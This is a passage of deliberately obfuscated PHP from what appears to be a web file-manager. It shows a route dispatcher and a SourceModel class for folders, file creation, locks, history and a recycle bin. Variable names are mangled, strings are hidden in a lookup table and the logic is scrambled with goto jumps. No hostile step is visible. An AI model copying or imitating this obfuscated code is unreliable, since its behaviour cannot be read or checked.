$EÍ…ƒŒÖì[0]; $E—†¹–´¤ô = $EÍ…ƒŒÖì[1]; } array_push(self::$maps, $aÒ†Õ¨Ë’ë); array_push(self::$routes, $c´ù«×›Ş); array_push(self::$methods, strtoupper($dÉ¡›·îÍŒ)); array_push(self::$callbacks, $E—†¹–´¤ô); } public static function error($F­ïÑÑå«Ş) { self::$errorCallback = $F­ïÑÑå«Ş; } public static function haltOnMatch($b¨§‡õò„ = true) { self::$halts = $b¨§‡õò„; } public static function dispatch() { goto DÇ¹Á÷Èï; AµßŠƒãõí: self::$routes = preg_replace($FÀÒĞ•ˆÃ[1162], $FÀÒĞ•ˆÃ[8], self::$routes); if (in_array($f§ƒ«‚„ñ¯, self::$routes)) { $Eí¦ç…•ˆ™ = array_keys(self::$routes, $f§ƒ«‚„ñ¯); foreach ($Eí¦ç…•ˆ™ as $F¼Ñ£“¼àğ) { if (self::$methods[$F¼Ñ£“¼àğ] == $C‡šÈªçİ || self::$methods[$F¼Ñ£“¼àğ] == $FÀÒĞ•ˆÃ[1478] || in_array($C‡šÈªçİ, self::$maps[$F¼Ñ£“¼àğ])) { $F¹²›ÃĞ…Õ = !0; if (!is_object(self::$callbacks[$F¼Ñ£“¼àğ])) { $f²ÑÊŠ ¸ = explode($FÀÒĞ•ˆÃ[8], self::$callbacks[$F¼Ñ£“¼àğ]); $C´é™Æƒ§³ = end($f²ÑÊŠ ¸); $fó„×´Œˆö = explode($FÀÒĞ•ˆÃ[1479], $C´é™Æƒ§³); $Fº‡·˜ƒˆ‹ = new $fó„×´Œˆö[0](); $Fº‡·˜ƒˆ‹->{$fó„×´Œˆö[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$F¼Ñ£“¼àğ]); if (self::$halts) { return; } } } } } else { $A«‡İ±°¿ = 0; foreach (self::$routes as $F¼Ñ£“¼àğ) { if (strpos($F¼Ñ£“¼àğ, $FÀÒĞ•ˆÃ[4]) !== !1) { $F¼Ñ£“¼àğ = str_replace($c¸Ìã›»Ø¤, $aŠÅÙ´ÖË, $F¼Ñ£“¼àğ); } if (preg_match($FÀÒĞ•ˆÃ[1480] . $F¼Ñ£“¼àğ . $FÀÒĞ•ˆÃ[1481], $f§ƒ«‚„ñ¯, $B¾…Ñ‘Šİè)) { if (self::$methods[$A«‡İ±°¿] == $C‡šÈªçİ || self::$methods[$A«‡İ±°¿] == $FÀÒĞ•ˆÃ[1478] || !empty(self::$maps[$A«‡İ±°¿]) && in_array($C‡šÈªçİ, self::$maps[$A«‡İ±°¿])) { $F¹²›ÃĞ…Õ = !0; array_shift($B¾…Ñ‘Šİè); if (!is_object(self::$callbacks[$A«‡İ±°¿])) { $f²ÑÊŠ ¸ = explode($FÀÒĞ•ˆÃ[8], self::$callbacks[$A«‡İ±°¿]); $C´é™Æƒ§³ = end($f²ÑÊŠ ¸); $fó„×´Œˆö = explode($FÀÒĞ•ˆÃ[1479], $C´é™Æƒ§³); $Fº‡·˜ƒˆ‹ = new $fó„×´Œˆö[0](); if (!method_exists($Fº‡·˜ƒˆ‹, $fó„×´Œˆö[1])) { echo $FÀÒĞ•ˆÃ[1482]; } else { call_user_func_array(array($Fº‡·˜ƒˆ‹, $fó„×´Œˆö[1]), $B¾…Ñ‘Šİè); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$A«‡İ±°¿], $B¾…Ñ‘Šİè); if (self::$halts) { return; } } } } $A«‡İ±°¿++; } } if ($F¹²›ÃĞ…Õ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $D…ÃôôÄß =& $_SERVER[Ç³Íß¦Ó]; header($_SERVER[$D…ÃôôÄß[1483]] . $D…ÃôôÄß[1484]); echo $D…ÃôôÄß[1485]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$FÀÒĞ•ˆÃ[1477]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto dŠàÌôÍÅ; DÇ¹Á÷Èï: $FÀÒĞ•ˆÃ =& $_SERVER[Ç³Íß¦Ó]; $f§ƒ«‚„ñ¯ = parse_url($_SERVER[$FÀÒĞ•ˆÃ[1477]], PHP_URL_PATH); $C‡šÈªçİ = $_SERVER[$FÀÒĞ•ˆÃ[157]]; goto Eó‰ÃÈ¬÷; Eó‰ÃÈ¬÷: $c¸Ìã›»Ø¤ = array_keys(static::$patterns); $aŠÅÙ´ÖË = array_values(static::$patterns); $F¹²›ÃĞ…Õ = !1; goto AµßŠƒãõí; dŠàÌôÍÅ: } } goto C‡Òï±Ãêé; cô”íç’è: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($e¢ŒÜˆ–Ó«) { $E‡î£¦ŒÖò =& $_SERVER[Ç³Íß¦Ó]; $dÃÔ §³ÅÔ = Model($E‡î£¦ŒÖò[501])->where(array($E‡î£¦ŒÖò[1518] => $e¢ŒÜˆ–Ó«))->find(); $b°µ«Š¸óƒ = $this->_mkdirRoot(SourceModel::TYPE_USER, $e¢ŒÜˆ–Ó«, $dÃÔ §³ÅÔ[$E‡î£¦ŒÖò[28]]); $this->userDesktopAdd($b°µ«Š¸óƒ); return $b°µ«Š¸óƒ; } public function userDesktopAdd($bĞå†ĞÇí) { $C ‡í¹·¼Õ =& $_SERVER[Ç³Íß¦Ó]; $båŞˆ˜´”Ò = LNG($C ‡í¹·¼Õ[1948]); $B˜Áöø‹ÆŞ = $this->mkdir($bĞå†ĞÇí, $båŞˆ˜´”Ò); $this->metaSet($B˜Áöø‹ÆŞ, $C ‡í¹·¼Õ[1949], $C ‡í¹·¼Õ[87]); $this->metaSet($bĞå†ĞÇí, $C ‡í¹·¼Õ[1950], $B˜Áöø‹ÆŞ); } public function groupRootAdd($Dò‡±–ä¤™) { $CöêÁ·Ô£õ =& $_SERVER[Ç³Íß¦Ó]; $Fî¢Ñ¤‚ì‰ = Model($CöêÁ·Ô£õ[484])->where(array($CöêÁ·Ô£õ[1767] => $Dò‡±–ä¤™))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Dò‡±–ä¤™, $Fî¢Ñ¤‚ì‰[$CöêÁ·Ô£õ[28]]); } public function systemRootPathAdd($e‰ÍÖÀœš) { if ($e‰ÍÖÀœš != $_SERVER[Ç³Íß¦Ó][504]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $e‰ÍÖÀœš); } public function userRootRemove($Eˆ×©«¬ºĞ) { $eîëÂÔ´ = $this->sourceRoot(SourceModel::TYPE_USER, $Eˆ×©«¬ºĞ); if (!$eîëÂÔ´) { return; } $this->remove($eîëÂÔ´, !1); } public function groupRootRemove($bÙµ«˜“¤Š) { $AìŠí“¨ï­ = $this->sourceRoot(SourceModel::TYPE_GROUP, $bÙµ«˜“¤Š); if (!$AìŠí“¨ï­) { return; } $this->remove($AìŠí“¨ï­, !1); } private function _mkdirRoot($f¿¥²Ù™†Ç, $cÍĞ‘ÃøÖè, $f»åàâÕ·º) { goto B¢Ü¢ö«ô; B¢Ü¢ö«ô: $fÛ—ô…Òñ =& $_SERVER[Ç³Íß¦Ó]; $DĞ¶•Ø´ = array($fÛ—ô…Òñ[393] => 0, $fÛ—ô…Òñ[548] => $f¿¥²Ù™†Ç, $fÛ—ô…Òñ[549] => $cÍĞ‘ÃøÖè, $fÛ—ô…Òñ[545] => 1, $fÛ—ô…Òñ[550] => USER_ID, $fÛ—ô…Òñ[551] => USER_ID, $fÛ—ô…Òñ[546] => $fÛ—ô…Òñ[33], $fÛ—ô…Òñ[552] => $fÛ—ô…Òñ[497], $fÛ—ô…Òñ[420] => 0, $fÛ—ô…Òñ[547] => 0, $fÛ—ô…Òñ[446] => 0, $fÛ—ô…Òñ[553] => $fÛ—ô…Òñ[33]); if ($d’¬ÖßÍÓğ = $this->where($DĞ¶•Ø´)->find()) { return $d’¬ÖßÍÓğ[$fÛ—ô…Òñ[394]]; } goto bÒ’†—´„ğ; c±§àé‡°ß: CacheLock::unlock($AØÒÏ©Ù§); return $c‰œä¬ˆ¤; goto cÔÏô„‹²; bÒ’†—´„ğ: $AØÒÏ©Ù§ = "\x4d\157\x64\x65\x6c\x53\x6f\165\x72\143\145\x2e\x6d\153\x64\x69\x72\122\157\157\x74\x2e{$f¿¥²Ù™†Ç}\56{$cÍĞ‘ÃøÖè}\x2e" . $f»åàâÕ·º; CacheLock::lock($AØÒÏ©Ù§); $DĞ¶•Ø´[$fÛ—ô…Òñ[28]] = $f»åàâÕ·º; goto F¶ÑÏ»§ŒĞ; F¶ÑÏ»§ŒĞ: $c‰œä¬ˆ¤ = $this->add($DĞ¶•Ø´); $CˆÎ‰òâ½ = array($fÛ—ô…Òñ[554] => short_id($c‰œä¬ˆ¤)); $this->where(array($fÛ—ô…Òñ[408] => $c‰œä¬ˆ¤))->save($CˆÎ‰òâ½); goto c±§àé‡°ß; cÔÏô„‹²: } private function sourceRoot($F°šÁ, $E¹ó˜ÃÃÃ, $fª™ÉäñÒ = false) { $b‰…ø³¡ã± =& $_SERVER[Ç³Íß¦Ó]; $b®Ì¦ù½ = array($b‰…ø³¡ã±[393] => 0, $b‰…ø³¡ã±[548] => $F°šÁ, $b‰…ø³¡ã±[549] => $E¹ó˜ÃÃÃ); if ($Bšõ¤‹» = $this->where($b®Ì¦ù½)->find()) { return $fª™ÉäñÒ ? $Bšõ¤‹» : $Bšõ¤‹»[$b‰…ø³¡ã±[394]]; } return !1; } public function sourceRootGroup($C¿¶‹–¶¥½) { goto Fß´´¹ë•‘; Fß´´¹ë•‘: $C†Ü¹›ÖÇ‘ =& $_SERVER[Ç³Íß¦Ó]; if (is_string($C¿¶‹–¶¥½)) { $C¿¶‹–¶¥½ = array($C¿¶‹–¶¥½); } $eİ×ÍäÖÑÕ = array($C†Ü¹›ÖÇ‘[393] => 0, $C†Ü¹›ÖÇ‘[548] => SourceModel::TYPE_GROUP, $C†Ü¹›ÖÇ‘[549] => array($C†Ü¹›ÖÇ‘[7], $C¿¶‹–¶¥½)); goto c‚„ù¥íÍ÷; c‚„ù¥íÍ÷: $this->selectPageReset(); $EºÍ‰‡ãˆÌ = $this->listSource($eİ×ÍäÖÑÕ, 1000); $this->selectPageRestore(); goto Aá…Ú—éá; Aá…Ú—éá: return array_to_keyvalue($EºÍ‰‡ãˆÌ[$C†Ü¹›ÖÇ‘[75]], $C†Ü¹›ÖÇ‘[482]); goto bµ­Ê‡Á‚¥; bµ­Ê‡Á‚¥: } public function mkfile($eÚÊô±ÜÇ™, $F„³‘ŠƒÉ”, $EÕÉôÅÀó’ = '', $cìà› Œ‹Ş = REPEAT_RENAME) { $bôÉß¸ÊÇ½ =& $_SERVER[Ç³Íß¦Ó]; $DÅ›Ü»‚ø = Model($bôÉß¸ÊÇ½[570])->addFileByContent($EÕÉôÅÀó’, $F„³‘ŠƒÉ”); return $this->_createFileCall($eÚÊô±ÜÇ™, $F„³‘ŠƒÉ”, $DÅ›Ü»‚ø, $cìà› Œ‹Ş, $bôÉß¸ÊÇ½[1214]); } public function addFile($CòĞÅà‰Æ£, $bµµò‹÷˜», $c¬†¨ç¾“È, $b²Üµí„ŠĞ = false, $CÚÇÅ…Ç‚ò = REPEAT_RENAME) { $E¬ƒ‹‚ƒ´ = Model($_SERVER[Ç³Íß¦Ó][570])->addFile($bµµò‹÷˜», $c¬†¨ç¾“È, $b²Üµí„ŠĞ); return $this->_createFileCall($CòĞÅà‰Æ£, $c¬†¨ç¾“È, $E¬ƒ‹‚ƒ´, $CÚÇÅ…Ç‚ò); } public function addFileByFileID($eâìÖôÙ¦Ğ, $C¬Ø®à•Á, $b‡ ÌÂ‡Ä, $BÕ‡¸¦¬‘† = REPEAT_RENAME) { $f¢¾ôÅßÂ¢ =& $_SERVER[Ç³Íß¦Ó]; $fá®Š•Œè = Model($f¢¾ôÅßÂ¢[570])->find($C¬Ø®à•Á); Model($f¢¾ôÅßÂ¢[570])->linkAdd($C¬Ø®à•Á); return $this->_createFileCall($eâìÖôÙ¦Ğ, $b‡ ÌÂ‡Ä, $fá®Š•Œè, $BÕ‡¸¦¬‘†); } public function addFileByRemote($A‚å¬´£„ø, $DóÆÅ‚ÂÌÕ, $e‘ÁŞ·‡¹Î, $eš•‘á§£ = array(), $eÌßˆ¥¾–µ = REPEAT_RENAME) { $dÄŒøß… = Model($_SERVER[Ç³Íß¦Ó][570])->addFileByRemote($DóÆÅ‚ÂÌÕ, $e‘ÁŞ·‡¹Î, $eš•‘á§£); return $this->_createFileCall($A‚å¬´£„ø, $e‘ÁŞ·‡¹Î, $dÄŒøß…, $eÌßˆ¥¾–µ); } private function _createFileCall($féğÑÍ˜Å×, $CÍÚÈ›ï­, $bëÄ©•‡÷, $d´êÎë‚–Æ, $CÒ©‚Ö¡†‘ = "\165\x70\x6c\x6f\141\144") { goto FÒ·¶†„; c‰Ä•ÁÃãË: $f† ç¼èä— = $this->fileNameExist($féğÑÍ˜Å×, $CÍÚÈ›ï­); $dîó—’ï = $this->_createFile($féğÑÍ˜Å×, $CÍÚÈ›ï­, $bëÄ©•‡÷, $d´êÎë‚–Æ, $E½õèœµİ¿); if (!$E½õèœµİ¿) { Model($AƒÁÚ„ÌÂ[448])->remove($bëÄ©•‡÷[$AƒÁÚ„ÌÂ[445]]); } goto c»òÂÎø½Ì; FÒ·¶†„: $AƒÁÚ„ÌÂ =& $_SERVER[Ç³Íß¦Ó]; $E½õèœµİ¿ = !1; $this->lockWriteStart($féğÑÍ˜Å×, $CÍÚÈ›ï­); goto c‰Ä•ÁÃãË; c»òÂÎø½Ì: if ($E½õèœµİ¿ && $dîó—’ï && $dîó—’ï != $f† ç¼èä—) { Model($AƒÁÚ„ÌÂ[1919])->eventCreate($dîó—’ï, $CÒ©‚Ö¡†‘); } $this->lockWriteEnd($féğÑÍ˜Å×, $CÍÚÈ›ï­); return $dîó—’ï; goto CãÓ³÷©•Ñ; CãÓ³÷©•Ñ: } public function mkdir($b‚ÄŠ‹Û›±, $Bßò‡³ô²‚, $A£Ùªªïº• = REPEAT_SKIP) { goto Eš¨š–æ–é; Eš¨š–æ–é: $cÃ¢‚œ¡•Ì =& $_SERVER[Ç³Íß¦Ó]; $fŸõï¶‡¨ = $this->sourceInfo($b‚ÄŠ‹Û›±); if (!$fŸõï¶‡¨) { return !1; } goto bŒ®àôĞ«¤; bŒ®àôĞ«¤: $this->lockWriteStart($b‚ÄŠ‹Û›±, $Bßò‡³ô²‚); if ($A£Ùªªïº• !== !1) { $a‚Åö‹š§ = $this->fileNameExist($b‚ÄŠ‹Û›±, $Bßò‡³ô²‚); if ($a‚Åö‹š§ && $A£Ùªªïº• != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($b‚ÄŠ‹Û›±, $Bßò‡³ô²‚); return $a‚Åö‹š§; } $Bßò‡³ô²‚ = $this->fileNameAuto($b‚ÄŠ‹Û›±, $Bßò‡³ô²‚, $A£Ùªªïº•); } $b¼™°Óš»… = array($cÃ¢‚œ¡•Ì[545] => 1, $cÃ¢‚œ¡•Ì[411] => $Bßò‡³ô²‚, $cÃ¢‚œ¡•Ì[546] => $cÃ¢‚œ¡•Ì[33], $cÃ¢‚œ¡•Ì[446] => 0, $cÃ¢‚œ¡•Ì[547] => 0); goto b‹îò½‰‰“; b‹îò½‰‰“: $FÙ¹­‰¢Ë° = $this->_addSoure($b¼™°Óš»…, $fŸõï¶‡¨); Model($cÃ¢‚œ¡•Ì[1919])->eventCreate($FÙ¹­‰¢Ë°, $cÃ¢‚œ¡•Ì[1215]); $this->lockWriteEnd($b‚ÄŠ‹Û›±, $Bßò‡³ô²‚); goto c÷è¼åÀ”; c÷è¼åÀ”: return $FÙ¹­‰¢Ë°; goto eîÁìÈ½; eîÁìÈ½: } private function _createFile($cãøªÈÏ»ˆ, $C­ÃÉ‘Ò‰ó, $D¬øéÃ’‡Ğ, $d‹õØ”Ò¨Ñ, &$d²Ê‘ô¯ÈË) { goto b«êãâÁ; b™çÒÈğ»: return $FÚö ¬Êœ×; goto b”¯§«²Î; f·èä«õ: $FæÀ”˜ö– = array($Cç‹¶«õ[545] => 0, $Cç‹¶«õ[411] => $C­ÃÉ‘Ò‰ó, $Cç‹¶«õ[546] => get_path_ext($C­ÃÉ‘Ò‰ó), $Cç‹¶«õ[446] => $D¬øéÃ’‡Ğ[$Cç‹¶«õ[445]], $Cç‹¶«õ[547] => $D¬øéÃ’‡Ğ[$Cç‹¶«õ[78]]); $FÚö ¬Êœ× = $this->_addSoure($FæÀ”˜ö–, $FÊÁ„ î“Œ); $this->folderSizeReset($cãøªÈÏ»ˆ, intval($FæÀ”˜ö–[$Cç‹¶«õ[78]])); goto b™çÒÈğ»; AÄ¼íÕÑø–: if ($d‹õØ”Ò¨Ñ !== !1) { $eĞÇÃ½ë„Ë = $this->fileNameExist($cãøªÈÏ»ˆ, $C­ÃÉ‘Ò‰ó); } $d²Ê‘ô¯ÈË = !0; if ($d‹õØ”Ò¨Ñ && $eĞÇÃ½ë„Ë) { if ($d‹õØ”Ò¨Ñ == REPEAT_SKIP) { $d²Ê‘ô¯ÈË = !1; return $eĞÇÃ½ë„Ë; } else { if ($d‹õØ”Ò¨Ñ == REPEAT_REPLACE) { $DÉŞ£‰î½« = $this->sourceInfo($eĞÇÃ½ë„Ë); $dì³ÑŒá„ = $this->fileHistory($DÉŞ£‰î½«, $D¬øéÃ’‡Ğ[$Cç‹¶«õ[445]], $D¬øéÃ’‡Ğ[$Cç‹¶«õ[78]]); if (!$dì³ÑŒá„) { $d²Ê‘ô¯ÈË = !1; } else { $this->folderSizeReset($cãøªÈÏ»ˆ); } return $eĞÇÃ½ë„Ë; } else { $C­ÃÉ‘Ò‰ó = $this->fileNameAuto($cãøªÈÏ»ˆ, $C­ÃÉ‘Ò‰ó, $d‹õØ”Ò¨Ñ, !1); } } } goto f·èä«õ; b«êãâÁ: $Cç‹¶«õ =& $_SERVER[Ç³Íß¦Ó]; $FÊÁ„ î“Œ = $this->sourceInfo($cãøªÈÏ»ˆ); if (!$D¬øéÃ’‡Ğ || !$FÊÁ„ î“Œ) { return !1; } goto AÄ¼íÕÑø–; b”¯§«²Î: } protected function fileHistory($bÓ¡ˆîÁÀ, $eñç…“ù˜à, $a»…ì‹ğ§¹) { goto aôä»ôë¢Ú; aôä»ôë¢Ú: $d…™¦»Î£ =& $_SERVER[Ç³Íß¦Ó]; if ($bÓ¡ˆîÁÀ[$d…™¦»Î£[445]] == $eñç…“ù˜à) { return !1; } $this->checkLock($bÓ¡ˆîÁÀ[$d…™¦»Î£[394]], $eñç…“ù˜à); goto EæÈÙª„Ş®; déÍÌ•¬ó: $this->sourceCacheClear($bÓ¡ˆîÁÀ[$d…™¦»Î£[394]]); return !0; goto cäôñâŒùì; EæÈÙª„Ş®: Model($d…™¦»Î£[1951])->addHistory($bÓ¡ˆîÁÀ); $cğÀ´¬Š©‰ = array($d…™¦»Î£[551] => USER_ID, $d…™¦»Î£[415] => time(), $d…™¦»Î£[445] => $eñç…“ù˜à, $d…™¦»Î£[78] => $a»…ì‹ğ§¹); $this->where(array($d…™¦»Î£[408] => $bÓ¡ˆîÁÀ[$d…™¦»Î£[394]]))->save($cğÀ´¬Š©‰); goto déÍÌ•¬ó; cäôñâŒùì: } public function checkLock($E¬ùİ±ÑÂÊ, $Côã¨±³»Ş) { goto FÕ¤íåÓó•; FÏØäÇ°õ¢: show_json(LNG($d‡±Óìµ¥[1954]) . $d‡±Óìµ¥[1955] . LNG($d‡±Óìµ¥[1956]) . $d‡±Óìµ¥[1957] . $d©¬ÙÈ®„ . $d‡±Óìµ¥[1958], !1); goto Bç•… ¦¥¥; DÀƒ’ë°Æ©: $this->_createFileCall($aÒÇŒ†ëß™[$d‡±Óìµ¥[476]], $e÷ñš±‰ªæ, $D›–ô×·à¸, REPEAT_REPLACE, $d‡±Óìµ¥[1214]); $AÆ¨Š†ÕñÇ = $aÒÇŒ†ëß™[$d‡±Óìµ¥[443]][$d‡±Óìµ¥[509]]; $d©¬ÙÈ®„ = $AÆ¨Š†ÕñÇ[$d‡±Óìµ¥[1953]] ? $AÆ¨Š†ÕñÇ[$d‡±Óìµ¥[1953]] : $AÆ¨Š†ÕñÇ[$d‡±Óìµ¥[28]]; goto FÏØäÇ°õ¢; FÕ¤íåÓó•: $d‡±Óìµ¥ =& $_SERVER[Ç³Íß¦Ó]; $aÒÇŒ†ëß™ = $this->pathInfo($E¬ùİ±ÑÂÊ); if (!$this->fileIsLock($aÒÇŒ†ëß™, !0)) { return; } goto FÌ×É†¨; FÌ×É†¨: $D­£ÙˆïÆö = Session::get($d‡±Óìµ¥[1952]); $e÷ñš±‰ªæ = substr($aÒÇŒ†ëß™[$d‡±Óìµ¥[28]], 0, -1 - strlen($aÒÇŒ†ëß™[$d‡±Óìµ¥[168]])) . $d‡±Óìµ¥[1479] . $D­£ÙˆïÆö . $d‡±Óìµ¥[95] . $aÒÇŒ†ëß™[$d‡±Óìµ¥[168]]; $D›–ô×·à¸ = Model($d‡±Óìµ¥[570])->find($Côã¨±³»Ş); goto DÀƒ’ë°Æ©; Bç•… ¦¥¥: } public function fileIsLock($f¾ÜğÓ¸Æ¼, $dÆî‰¿õ• = false) { goto eÅµÑª²ê¼; bğ´•Ó¤İœ: $Cœ¿¼É« = $GLOBALS[$díç­†Ù‡Ô[6]][$díç­†Ù‡Ô[88]][$díç­†Ù‡Ô[507]]; if ($f¾ÜğÓ¸Æ¼[$díç­†Ù‡Ô[443]][$díç­†Ù‡Ô[508]] <= time() - $Cœ¿¼É«) { $this->metaSet($f¾ÜğÓ¸Æ¼[$díç­†Ù‡Ô[394]], $díç­†Ù‡Ô[506], null); $this->metaSet($f¾ÜğÓ¸Æ¼[$díç­†Ù‡Ô[394]], $díç­†Ù‡Ô[508], null); } if ($dÆî‰¿õ•) { $this->metaSet($f¾ÜğÓ¸Æ¼[$díç­†Ù‡Ô[394]], $díç­†Ù‡Ô[508], time()); } goto E§øµ™Î‹; E§øµ™Î‹: return !1; goto d¥¨¸»‚Ö; eÅµÑª²ê¼: $díç­†Ù‡Ô =& $_SERVER[Ç³Íß¦Ó]; if (!isset($f¾ÜğÓ¸Æ¼[$díç­†Ù‡Ô[443]]) || !$f¾ÜğÓ¸Æ¼[$díç­†Ù‡Ô[443]][$díç­†Ù‡Ô[506]]) { return !1; } if ($f¾ÜğÓ¸Æ¼[$díç­†Ù‡Ô[443]][$díç­†Ù‡Ô[506]] != USER_ID) { return !0; } goto bğ´•Ó¤İœ; d¥¨¸»‚Ö: } private function _addSoure($e›Æ¹‚ƒÓÚ, $dßŸ„Æ†Î¥) { goto eóîŞÁ™´; Aêªø…§Ñ: $DŸœ§«ø˜Ó = array($DàÃ˜Æ¤ó[554] => short_id($DÍÈÃ—›¾£)); $this->where(array($DàÃ˜Æ¤ó[408] => $DÍÈÃ—›¾£))->save($DŸœ§«ø˜Ó); $this->setNamePinyin($DÍÈÃ—›¾£, $e›Æ¹‚ƒÓÚ[$DàÃ˜Æ¤ó[28]]); goto Aù‡š˜ëš; Eò£“›„¹Ä: $this->updateModifyTime($e›Æ¹‚ƒÓÚ[$DàÃ˜Æ¤ó[476]]); $F…î‡•àÎà = $DàÃ˜Æ¤ó[1959] . $dßŸ„Æ†Î¥[$DàÃ˜Æ¤ó[394]]; if (isset(self::$cacheChildList[$F…î‡•àÎà])) { unset(self::$cacheChildList[$F…î‡•àÎà]); } goto EÇØ£»Çóå; Aù‡š˜ëš: return $DÍÈÃ—›¾£; goto câãùĞİÖ…; eóîŞÁ™´: $DàÃ˜Æ¤ó =& $_SERVER[Ç³Íß¦Ó]; $E–Ûˆ•ù’Õ = array($DàÃ˜Æ¤ó[548] => $dßŸ„Æ†Î¥[$DàÃ˜Æ¤ó[402]], $DàÃ˜Æ¤ó[549] => $dßŸ„Æ†Î¥[$DàÃ˜Æ¤ó[482]], $DàÃ˜Æ¤ó[550] => USER_ID, $DàÃ˜Æ¤ó[551] => USER_ID, $DàÃ˜Æ¤ó[393] => $dßŸ„Æ†Î¥[$DàÃ˜Æ¤ó[394]], $DàÃ˜Æ¤ó[552] => $dßŸ„Æ†Î¥[$DàÃ˜Æ¤ó[485]] . $dßŸ„Æ†Î¥[$DàÃ˜Æ¤ó[394]] . $DàÃ˜Æ¤ó[47], $DàÃ˜Æ¤ó[420] => 0, $DàÃ˜Æ¤ó[553] => $DàÃ˜Æ¤ó[33]); $e›Æ¹‚ƒÓÚ = array_merge($E–Ûˆ•ù’Õ, $e›Æ¹‚ƒÓÚ); goto Eò£“›„¹Ä; EÇØ£»Çóå: static $a—‘ìàŒƒ— = false; if (!$a—‘ìàŒƒ—) { Hook::trigger($DàÃ˜Æ¤ó[535], $e›Æ¹‚ƒÓÚ); $a—‘ìàŒƒ— = !0; } $DÍÈÃ—›¾£ = $this->add($e›Æ¹‚ƒÓÚ); goto Aêªø…§Ñ; câãùĞİÖ…: } public function remove($fà«ùŸİ‹, $f‹ÍãĞÖ‚İ = true) { goto dºˆ’ïï®ë; F«˜ä•’ĞÇ: return $F´À¯¥…­ã; goto BÍ‘œŒ†„†; dºˆ’ïï®ë: $Eáäîàùİ¯ =& $_SERVER[Ç³Íß¦Ó]; $cš‘ÔÁí©¤ = $this->sourceInfo($fà«ùŸİ‹); $c¡ºø¨ÆÓº = intval($cš‘ÔÁí©¤[$Eáäîàùİ¯[402]]) === self::TYPE_SYSTEM; goto aóºÅšĞÏ; cö·é±Ü”ï: $this->recycleClear($cš‘ÔÁí©¤); $F´À¯¥…­ã = $this->move($fà«ùŸİ‹, $dŸ…èËõì, REPEAT_RENAME_FOLDER); $this->folderSizeReset($cš‘ÔÁí©¤[$Eáäîàùİ¯[476]]); goto F«˜ä•’ĞÇ; d–¯ùë‰ÆÍ: CacheLock::unlock($BŞöí¿åÇ); $this->metaSet($fà«ùŸİ‹, $Eáäîàùİ¯[1968], $cš‘ÔÁí©¤[$Eáäîàùİ¯[476]]); $this->where(array($Eáäîàùİ¯[394] => $fà«ùŸİ‹))->save(array($Eáäîàùİ¯[415] => time())); goto cö·é±Ü”ï; Bºëœ…‰‰: CacheLock::lock($BŞöí¿åÇ); $dŸ…èËõì = $this->fileNameExist($bé®¾Ï´ò‰, $b¡ŞãœßÀ); if (!$dŸ…èËõì) { $dŸ…èËõì = $this->mkdir($bé®¾Ï´ò‰, $b¡ŞãœßÀ, REPEAT_SKIP); $this->metaSet($dŸ…èËõì, $Eáäîàùİ¯[1964], $f†š™º›¿ä); $this->metaSet($dŸ…èËõì, $Eáäîàùİ¯[1965], $cš‘ÔÁí©¤[$Eáäîàùİ¯[482]]); if ($cš‘ÔÁí©¤[$Eáäîàùİ¯[476]] != 0) { $this->metaSet($dŸ…èËõì, $Eáäîàùİ¯[1966], _get($b¹¨÷ã¥Äº, $Eáäîàùİ¯[1967])); } } goto d–¯ùë‰ÆÍ; aóºÅšĞÏ: $b…ÖˆÍ‹İ = Model($Eáäîàùİ¯[1525])->get($Eáäîàùİ¯[1960]) == $Eáäîàùİ¯[87]; if ($c¡ºø¨ÆÓº || $f‹ÍãĞÖ‚İ || !$b…ÖˆÍ‹İ) { return $this->removeNow($fà«ùŸİ‹, $f‹ÍãĞÖ‚İ); } $bé®¾Ï´ò‰ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto BÃ‚Á‹ù¬; BÃ‚Á‹ù¬: $f†š™º›¿ä = $cš‘ÔÁí©¤[$Eáäîàùİ¯[402]] == self::TYPE_USER ? $Eáäîàùİ¯[561] : $Eáäîàùİ¯[1015]; if ($f†š™º›¿ä == $Eáäîàùİ¯[561]) { $b¹¨÷ã¥Äº = Model($Eáäîàùİ¯[501])->getInfo($cš‘ÔÁí©¤[$Eáäîàùİ¯[482]]); $b¡ŞãœßÀ = !empty($b¹¨÷ã¥Äº[$Eáäîàùİ¯[1953]]) ? $b¹¨÷ã¥Äº[$Eáäîàùİ¯[1953]] : $b¹¨÷ã¥Äº[$Eáäîàùİ¯[28]]; $b¡ŞãœßÀ = $Eáäîàùİ¯[257] . $b¡ŞãœßÀ . $Eáäîàùİ¯[1961] . $cš‘ÔÁí©¤[$Eáäîàùİ¯[482]]; } else { $b¹¨÷ã¥Äº = Model($Eáäîàùİ¯[484])->getInfo($cš‘ÔÁí©¤[$Eáäîàùİ¯[482]]); $b¡ŞãœßÀ = _get($b¹¨÷ã¥Äº, $Eáäîàùİ¯[28]); $b¡ŞãœßÀ = $Eáäîàùİ¯[160] . $b¡ŞãœßÀ . $Eáäîàùİ¯[1962] . $cš‘ÔÁí©¤[$Eáäîàùİ¯[482]]; } $BŞöí¿åÇ = $Eáäîàùİ¯[1963] . md5($b¡ŞãœßÀ); goto Bºëœ…‰‰; BÍ‘œŒ†„†: } private function recycleClear($C»îÃçï•) { $eØºİÍ¡Í =& $_SERVER[Ç³Íß¦Ó]; $a’Ò•¶óØ = $this->childrenAll($C»îÃçï•); $Bˆç—‡ºï = array($eØºİÍ¡Í[408] => array($eØºİÍ¡Í[409], $a’Ò•¶óØ[$eØºİÍ¡Í[1969]])); Model($eØºİÍ¡Í[1970])->where($Bˆç—‡ºï)->delete(); } public function removeNow($cĞ‹‰Â¥Âæ, $FŸçâîŞ = true) { goto A–Ø«Ó¯; f¶ï•…„“: if (!$Dß´±¿‡Ò) { return !0; } if ($Dß´±¿‡Ò[$F·¼†¬ïõÙ[476]] == 0) { if (!_get($GLOBALS, $F·¼†¬ïõÙ[483])) { return !1; } } $this->lockMoveStart($cĞ‹‰Â¥Âæ); goto FÜÏ•·¸•; FÜÏ•·¸•: Hook::trigger($F·¼†¬ïõÙ[1971], $b…á¨Ğ‹ã, $FŸçâîŞ); if ($FŸçâîŞ) { 